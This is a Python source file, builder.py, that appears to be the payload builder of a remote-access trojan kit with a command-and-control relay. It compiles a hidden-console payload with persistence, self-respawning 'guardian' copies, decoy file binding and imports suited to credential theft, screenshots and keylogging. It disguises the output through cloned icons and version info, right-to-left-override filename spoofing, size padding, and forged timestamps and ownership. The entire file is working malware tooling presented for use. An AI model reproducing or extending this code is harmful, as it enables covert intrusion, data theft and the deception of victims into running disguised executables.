# builder.py
import os, subprocess, shutil, tempfile, sys, base64, json, time, psutil, uuid
from pyinstaller_versionfile import create_versionfile
try:
    import win32file, win32con, win32api, win32security, pywintypes
    PYWIN32_AVAILABLE = True
except ImportError:
    PYWIN32_AVAILABLE = False

def set_process_priority(pid, priority_level, log_callback):
    try:
        p = psutil.Process(pid)
        if sys.platform == "win32":
            priority_map = {"Low": psutil.BELOW_NORMAL_PRIORITY_CLASS, "Normal": psutil.NORMAL_PRIORITY_CLASS, "High": psutil.HIGH_PRIORITY_CLASS}
            p.nice(priority_map.get(priority_level, psutil.NORMAL_PRIORITY_CLASS))
        log_callback(f"--> Build priority set to {priority_level}.")
    except Exception as e: log_callback(f"[ERROR] Failed to set build priority: {e}")

def _spoof_file_metadata(file_path, settings, log_callback):
    if not PYWIN32_AVAILABLE:
        log_callback("[WARNING] pywin32 not found. Skipping metadata spoofing.")
        return
    spoof_settings = settings.get("metadata_spoofing", {})
    if spoof_settings.get("timestamps_enabled"):
        log_callback("--> Spoofing file timestamps...")
        try:
            created_dt = spoof_settings["created"].toPyDateTime()
            modified_dt = spoof_settings["modified"].toPyDateTime()
            created_time = pywintypes.Time(created_dt)
            modified_time = pywintypes.Time(modified_dt)
            handle = win32file.CreateFile(file_path, win32con.GENERIC_WRITE, win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE, None, win32con.OPEN_EXISTING, win32con.FILE_ATTRIBUTE_NORMAL, None)
            win32file.SetFileTime(handle, created_time, None, modified_time)
            handle.Close()
            log_callback(f"[SUCCESS] Timestamps set to: Created={created_dt}, Modified={modified_dt}")
        except Exception as e:
            log_callback(f"[ERROR] Failed to set file timestamps: {e}")
    owner_to_set = spoof_settings.get("owner")
    if spoof_settings.get("owner_enabled") and owner_to_set != "Keep Current":
        log_callback(f"--> Spoofing file owner to '{owner_to_set}'...")
        try:
            sid = win32security.LookupAccountName(None, owner_to_set)[0]
            sd = win32security.SECURITY_DESCRIPTOR()
            sd.SetSecurityDescriptorOwner(sid, 0)
            win32security.SetFileSecurity(file_path, win32security.OWNER_SECURITY_INFORMATION, sd)
            log_callback(f"[SUCCESS] File owner changed to '{owner_to_set}'.")
        except pywintypes.error as e:
            if e.winerror == 1314:
                 log_callback("[ERROR] Failed to set owner: This operation requires administrative privileges. Please run the C2 as an administrator.")
            else:
                 log_callback(f"[ERROR] Failed to set owner: {e}")
        except Exception as e:
            log_callback(f"[ERROR] An unexpected error occurred while setting owner: {e}")

def build_payload(settings, relay_url, c2_user, log_callback, thread_object):
    main_payload_full_name = settings.get("payload_name") + settings.get("payload_ext")
    log_callback(f"--- Building Main Payload: {main_payload_full_name} ---")
    all_guardian_names = [g['name'] + g['ext'] for g in settings.get("guardians", [])]
    if settings.get("hydra"):
        all_guardian_names.append(main_payload_full_name) # The main payload is also a guardian
    
    success = _compile_single(main_payload_full_name, settings, relay_url, c2_user, log_callback, thread_object, all_guardian_names_for_template=all_guardian_names)
    if not success:
        log_callback(f"[ERROR] Failed to build main payload. Aborting.")
        return None

    if settings.get("hydra"):
        guardians = settings.get("guardians", [])
        for i, guardian_config in enumerate(guardians):
            guardian_full_name = guardian_config['name'] + guardian_config['ext']
            log_callback(f"\n--- Building Guardian {i+1}/{len(guardians)}: {guardian_full_name} ---")
            
            guardian_settings = settings.copy()
            guardian_settings['cloning']['icon'] = guardian_config.get('icon')
            guardian_settings['spoofed_ext'] = guardian_config.get('spoofed_ext')
            
            success = _compile_single(guardian_full_name, guardian_settings, relay_url, c2_user, log_callback, thread_object, all_guardian_names_for_template=all_guardian_names)
            if not success:
                log_callback(f"[ERROR] Failed to build guardian {guardian_full_name}. Aborting.")
                return None
    
    log_callback("\n[SUCCESS] All payloads built successfully.")
    return thread_object.proc

def _compile_single(payload_full_name, settings, relay_url, c2_user, log_callback, thread_object, all_guardian_names_for_template=None):
    with tempfile.TemporaryDirectory() as temp_dir:
        pyinstaller_name = os.path.splitext(payload_full_name)[0]
        pyinstaller_output_exe = f"{pyinstaller_name}.exe"
        temp_script_path = os.path.join(temp_dir, f"temp_{pyinstaller_name}.py")
        
        with open("payload/template.py", "r", encoding="utf-8") as f: code = f.read()
        
        code = code.replace("{{RELAY_URL}}", f"'{relay_url}'"); code = code.replace("{{C2_USER}}", f"'{c2_user}'")
        code = code.replace("{{PERSISTENCE_ENABLED}}", str(settings.get("persistence", False)))
        code = code.replace("{{HYDRA_ENABLED}}", str(settings.get("hydra", False)))
        guardian_list = all_guardian_names_for_template if all_guardian_names_for_template is not None else []
        code = code.replace("{{HYDRA_GUARDIANS}}", json.dumps(guardian_list))
        code = code.replace("{{POPUP_ENABLED}}", str(settings.get("popup_enabled", False)))
        code = code.replace("{{POPUP_TITLE}}", json.dumps(settings.get("popup_title", "")))
        code = code.replace("{{POPUP_MESSAGE}}", json.dumps(settings.get("popup_message", "")))
        decoy_filename = "''"; decoy_data_b64 = "''"; bind_path = settings.get("bind_path")
        if bind_path and os.path.exists(bind_path):
            decoy_filename = f"'{os.path.basename(bind_path)}'";
            with open(bind_path, 'rb') as f: decoy_data_b64 = f"'{base64.b64encode(f.read()).decode()}'"
        code = code.replace("{{DECOY_ENABLED}}", str(bool(bind_path)))
        code = code.replace("{{DECOY_FILENAME}}", decoy_filename)
        code = code.replace("{{DECOY_DATA_B64}}", decoy_data_b64)
        code = code.replace("{{STEALTH_MODE}}", str(settings.get("stealth", False)))
        
        with open(temp_script_path, "w", encoding="utf-8") as f: f.write(code)
        
        command = [sys.executable, "-m", "PyInstaller", '--onefile', '--noconsole', '--name', pyinstaller_name]
        cloning_settings = settings.get("cloning", {})
        if cloning_settings.get("enabled"):
            if cloning_settings.get("icon") and os.path.exists(cloning_settings["icon"]):
                command.extend(['--icon', cloning_settings["icon"]])
            version_file_path = os.path.join(temp_dir, "version.txt")
            create_versionfile(
                output_file=version_file_path, version=cloning_settings["version_info"].get("FileVersion", "1.0.0.0"),
                company_name=cloning_settings["version_info"].get("CompanyName", ""), file_description=cloning_settings["version_info"].get("FileDescription", ""),
                internal_name=cloning_settings["version_info"].get("OriginalFilename", ""), legal_copyright=cloning_settings["version_info"].get("LegalCopyright", ""),
                original_filename=cloning_settings["version_info"].get("OriginalFilename", ""), product_name=cloning_settings["version_info"].get("ProductName", "")
            )
            command.extend(['--version-file', version_file_path])

        hidden_imports = ['requests', 'psutil', 'win32crypt', 'mss', 'pynput', 'PIL', 'winreg', 'shutil', 'sqlite3', 'ctypes', 'socket', 'pefile']
        for imp in hidden_imports: command.extend(['--hidden-import', imp])
        command.append(temp_script_path)
        
        process = subprocess.Popen(command, cwd=temp_dir, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0, encoding='utf-8', errors='ignore')
        thread_object.proc = process
        time.sleep(1); set_process_priority(process.pid, settings.get("build_priority", "Normal"), log_callback)
        
        for line in iter(process.stdout.readline, ''):
            if not thread_object._is_running: break
            log_callback(line.strip())
        
        process.wait()
        
        if process.returncode == 0 and thread_object._is_running:
            output_dir = "output";
            if not os.path.exists(output_dir): os.makedirs(output_dir)
            
            built_exe_path = os.path.join(temp_dir, 'dist', pyinstaller_output_exe)
            spoofed_ext = settings.get('spoofed_ext')

            if spoofed_ext:
                rlo_char = '\u202e'
                reversed_spoofed_ext = spoofed_ext.strip('.')[::-1]
                final_filename = f"{pyinstaller_name}{rlo_char}{reversed_spoofed_ext}.scr"
                log_callback(f"--> Applying RLO spoof. Renaming to: {final_filename}")
            else:
                final_filename = payload_full_name

            final_exe_path = os.path.join(output_dir, final_filename)
            shutil.move(built_exe_path, final_exe_path)
            
            padding_settings = settings.get("padding", {})
            if padding_settings.get("enabled"):
                log_callback("--> Adding junk data to file...")
                padding_kb = padding_settings.get("size_kb", 0)
                if padding_kb > 0:
                    padding_bytes = padding_kb * 1024
                    try:
                        with open(final_exe_path, "ab") as f: f.write(b'\0' * padding_bytes)
                        log_callback(f"[SUCCESS] Added {padding_kb} KB of padding to file.")
                    except Exception as e: log_callback(f"[ERROR] Could not add padding to file: {e}")
                else: log_callback("[INFO] Padding amount was zero, skipping.")
            
            _spoof_file_metadata(final_exe_path, settings, log_callback)
            log_callback(f"[SUCCESS] '{final_filename}' saved to output folder.")
            return True
        elif thread_object._is_running:
            log_callback(f"[ERROR] PyInstaller failed for '{pyinstaller_name}' with code {process.returncode}.")
            return False
        else: return False